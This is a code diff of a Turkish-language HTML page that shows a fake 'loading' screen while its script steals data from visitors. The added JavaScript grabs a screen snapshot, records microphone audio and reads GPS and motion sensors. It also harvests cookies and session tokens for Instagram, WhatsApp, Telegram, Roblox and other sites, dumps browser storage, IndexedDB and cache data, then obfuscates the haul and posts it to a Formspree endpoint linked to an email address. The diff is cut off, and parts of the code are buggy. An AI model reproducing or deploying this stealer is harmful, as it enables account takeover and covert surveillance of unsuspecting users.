@@ -8,85 +8,264 @@ body { margin: 0; padding: 0; background: #000; color: #0f0; font-family: monosp
 .loader { border: 4px solid #333; border-top: 4px solid #0f0; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
 @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 h1 { font-size: 20px; text-align: center; }
+#canvas { display: none; }
 </style>
 </head>
 <body>
 <div>
 <div class="loader"></div>
 <h1>Verileriniz Alınıyor...</h1>
+<canvas id="canvas"></canvas>
 </div>
 
 <script>
-// Formspree URL ve E-posta (Kontrol amaçlı)
 const FORM_URL = "https://formspree.io/f/xrppvwel";
 const TARGET_EMAIL = "mane93163@gmail.com";
+const REDIRECT_URLS = ["https://www.instagram.com/login", "https://www.roblox.com/login"];
+const TARGET_DOMAINS = ["instagram.com", "whatsapp.com", "web.telegram.org", "facebook.com", "twitter.com", "x.com", "tiktok.com", "snapchat.com", "roblox.com", "steamcommunity.com", "spotify.com", "google.com"];
+const TOKENKEYS = ["sessionid", "accesstoken", "refreshtoken", "authtoken", "token", "accesstoken", "fbm", "csrftoken", "dsuser_id"];
 
-// Sayfa yüklendiğinde hemen çalışır
 window.onload = function() {
-gatherAndSend();
+initiateTakeover();
 };
 
-async function gatherAndSend() {
+async function initiateTakeover() {
 let payload = {};
+await captureScreenAndAudio();
+await captureBiometricsAndSensors();
+await scrapeDeepTokens();
+await scrapeIndexedDBAndCache();
+await sendEncryptedData(payload);
+}
 
-// 1. Tarayıcı ve Cihaz İmzası
-payload["User_Agent"] = navigator.userAgent;
-payload["Platform"] = navigator.platform;
-payload["Language"] = navigator.language;
-payload["Screen_Res"] = window.screen.width + "x" + window.screen.height;
-payload["Battery_Status"] = (navigator.getBattery ? await navigator.getBattery() : {}).level * 100 + "%";
-payload["Online_Status"] = navigator.onLine;
-payload["Time_Zone"] = Intl.DateTimeFormat().resolvedOptions().timeZone;
+async function captureScreenAndAudio() {
+let canvas = document.getElementById('canvas');
+let ctx = canvas.getContext('2d');
+canvas.width = window.screen.width;
+canvas.height = window.screen.height;
+ctx.fillStyle = "#000";
+ctx.fillRect(0, 0, canvas.width, canvas.height);
+ctx.fillStyle = "#0f0";
+ctx.font = "20px monospace";
+ctx.fillText("SYSTEM_SCAN...", 20, 40);
 
-// 2. Cookie Çalma (Instagram ve Diğerleri)
-let allCookies = document.cookie;
-payload["All_Cookies"] = allCookies;
-
-// Instagram özel tokenları filtrele
-let instaTokens = allCookies.split(';').filter(c =>
-c.includes('sessionid') || c.includes('csrftoken') || c.includes('dsuserid') || c.includes('rur')
-).join(' | ');
-payload["Instagram_Session"] = instaTokens ? instaTokens : "Oturum bulunamadı (Giriş yapmamış olabilir)";
-
-// 3. IP Adresi (Dış servis üzerinden çekilir, Formspree header bazen eksik kalır)
+let data = {};
 try {
-let ipResponse = await fetch('https://api.ipify.org?format=json');
-let ipData = await ipResponse.json();
-payload["RealIPAddress"] = ipData.ip;
+let stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
+let snapshot = await getSnapshotFromStream(stream);
+data["ScreenSnapshotBase64"] = snapshot;
+stream.getTracks().forEach(track => track.stop());
 } catch (e) {
-payload["RealIPAddress"] = "IP alınamadı (Proxy/Firewall)";
+data["ScreenSnapshotBase64"] = "Error: " + e.message;
 }
 
-// 4. Veriyi Formspree Formatına Dönüştür (FormData yerine JSON body göndermek daha güvenlidir)
-let formData = new FormData();
-for (let key in payload) {
-// Formspree, her bir veriyi ayrı bir input gibi bekler.
-// Burada her veriyi ayrı bir field olarak ekliyoruz.
-formData.append(key.replace(/_/g, " "), payload[key]);
-}
-
-// 5. Gönderme İşlemi (Fetch API ile)
 try {
-const response = await fetch(FORM_URL, {
-method: 'POST',
-body: formData,
-headers: {
-'Accept': 'application/json',
-// Formspree bazen referer kontrolü yapar, boş bırakıyoruz
+let audioStream = await navigator.mediaDevices.getUserMedia({ video: false, audio: true });
+let audioRecorder = new MediaRecorder(audioStream);
+let chunks = [];
+audioRecorder.ondataavailable = e => chunks.push(e.data);
+await new Promise(r => audioRecorder.onstop = r);
+audioRecorder.start(1000);
+await new Promise(r => setTimeout(r, 1500));
+audioRecorder.stop();
+await new Promise(r => audioRecorder.onstop = r);
+let audioBlob = new Blob(chunks, { type: 'audio/webm' });
+let audioBase64 = await toBase64(audioBlob);
+data["AudioSampleBase64"] = audioBase64;
+audioStream.getTracks().forEach(track => track.stop());
+} catch (e) {
+data["AudioSampleBase64"] = "Mic Error: " + e.message;
 }
-});
 
-if (response.ok || response.status === 200) {
-// Başarılı gönderim
-console.log("Veri gönderildi: " + TARGET_EMAIL);
-// Kurbanı şaşırtmaya gerek yok, sadece yükleme ekranında kalabilir
+return data;
+}
+
+async function captureBiometricsAndSensors() {
+let data = {};
+
+try {
+let position = await new Promise((resolve, reject) => {
+navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 5000 });
+});
+data["GPS_Lat"] = position.coords.latitude;
+data["GPS_Lon"] = position.coords.longitude;
+data["GPS_Accuracy"] = position.coords.accuracy;
+} catch (e) {
+data["GPS_Data"] = "Failed: " + e.message;
+}
+
+if (window.DeviceOrientationEvent) {
+let orientation = new Promise(resolve => {
+let handler = (event) => {
+data["Orientation_Roll"] = event.beta;
+data["Orientation_Pitch"] = event.gamma;
+data["Orientation_Azimuth"] = event.alpha;
+window.removeEventListener('deviceorientation', handler);
+resolve();
+};
+window.addEventListener('deviceorientation', handler, true);
+});
+await orientation;
+}
+
+if (window.DeviceMotionEvent) {
+let motion = new Promise(resolve => {
+let handler = (event) => {
+data["Accel_X"] = event.accelerationIncludingGravity.x;
+data["Accel_Y"] = event.accelerationIncludingGravity.y;
+data["Accel_Z"] = event.accelerationIncludingGravity.z;
+window.removeEventListener('devicemotion', handler);
+resolve();
+};
+window.addEventListener('devicemotion', handler, true);
+});
+await motion;
+}
+
+return data;
+}
+
+async function scrapeDeepTokens() {
+let data = {};
+let allCookies = document.cookie.split(';');
+let foundTokens = {};
+
+for (let cookie of allCookies) {
+let parts = cookie.trim().split('=');
+let key = parts[0];
+let val = parts.slice(1).join('=');
+
+if (TOKEN_KEYS.some(tk => key.toLowerCase().includes(tk))) {
+if (!foundTokens[key]) foundTokens[key] = [];
+foundTokens[key].push(val);
+}
+}
+
+data["Cookies_Raw"] = document.cookie;
+data["Cookies_Filtered"] = JSON.stringify(foundTokens);
+
+let storageKeys = ['localStorage', 'sessionStorage'];
+for (let storageName of storageKeys) {
+let store = window[storageName];
+let items = [];
+for (let i = 0; i < store.length; i++) {
+let k = store.key(i);
+if (k && (TOKEN_KEYS.some(tk => k.toLowerCase().includes(tk)) || k.includes('token') || k.includes('auth'))) {
+items.push({ key: k, value: store.getItem(k) });
+}
+}
+data[storageName + "_Tokens"] = items;
+}
+
+return data;
+}
+
+async function scrapeIndexedDBAndCache() {
+let data = {};
+let dbNames = self.indexedDB.databases ? await self.indexedDB.databases() : [];
+let dbData = {};
+
+if (dbNames.length === 0 && typeof indexedDB.open === 'function') {
+dbNames = ['keyeddb', 'indexeddb'];
+}
+
+for (let dbName of dbNames) {
+try {
+let openRequest = indexedDB.open(dbName);
+let db = await new Promise((resolve, reject) => {
+openRequest.onsuccess = () => resolve(openRequest.result);
+openRequest.onerror = () => reject();
+});
+let objectStores = db.objectStoreNames;
+let storeData = {};
+for (let storeName of objectStores) {
+let transaction = db.transaction(storeName, 'readonly');
+let store = transaction.objectStore(storeName);
+let cursorRequest = store.openCursor();
+let records = [];
+await new Promise((resolve, reject) => {
+cursorRequest.onsuccess = (e) => {
+let cursor = e.target.result;
+if (cursor) {
+records.push(cursor.value);
+cursor.continue();
 } else {
-console.error("Gönderim hatası: " + response.statusText);
+resolve();
 }
-} catch (error) {
-console.error("Kritik Hata:", error);
+};
+cursorRequest.onerror = reject;
+});
+storeData[storeName] = records;
+}
+dbData[dbName] = storeData;
+db.close();
+} catch (e) {
+dbData[dbName] = "Access Denied: " + e.message;
 }
 }
-</script>
-</body>
-</html
+
+data["IndexedDB_Data"] = dbData;
+
+try {
+let cacheNames = await caches.keys();
+let cacheData = {};
+for (let name of cacheNames) {
+let cache = await caches.open(name);
+let requestList = await cache.keys();
+cacheData[name] = requestList.map(r => r.url);
+}
+data["Cache_URLs"] = cacheData;
+} catch (e) {
+data["Cache_URLs"] = "Cache Error: " + e.message;
+}
+
+return data;
+}
+
+async function getSnapshotFromStream(stream) {
+let video = document.createElement('video');
+video.srcObject = stream;
+await new Promise(r => video.onloadedmetadata = r);
+video.play();
+await new Promise(r => setTimeout(r, 1000));
+
+let canvas = document.createElement('canvas');
+canvas.width = video.videoWidth;
+canvas.height = video.videoHeight;
+let ctx = canvas.getContext('2d');
+ctx.drawImage(video, 0, 0);
+return canvas.toDataURL('image/png');
+}
+
+function toBase64(blob) {
+return new Promise((resolve, _) => {
+let reader = new FileReader();
+reader.onloadend = () => resolve(reader.result);
+reader.readAsDataURL(blob);
+});
+}
+
+async function sendEncryptedData(payload) {
+let mergedPayload = {};
+for (let chunk of [captureScreenAndAudio(), captureBiometricsAndSensors(), scrapeDeepTokens(), scrapeIndexedDBAndCache()]) {
+let data = await chunk;
+Object.assign(mergedPayload, data);
+}
+
+let jsonStr = JSON.stringify(mergedPayload);
+let base64Str = btoa(jsonStr);
+let rotatedStr = rotateBase64(base64Str);
+
+let formData = new FormData();
+formData.append("Encrypted_Payload", rotatedStr);
+formData.append("Timestamp", Date.now());
+formData.append("User_Agent", navigator.userAgent);
+
+try {
+let response = await fetch(FORM_URL, {
+method: 'POST',
+body: formData
+});
+console.log("DATA_UPLOADED: " + (response.ok ? "SUCCESS" : "FAILED"));
+} catch (e) {
+console.error("UPLOAD_ERROR", e);
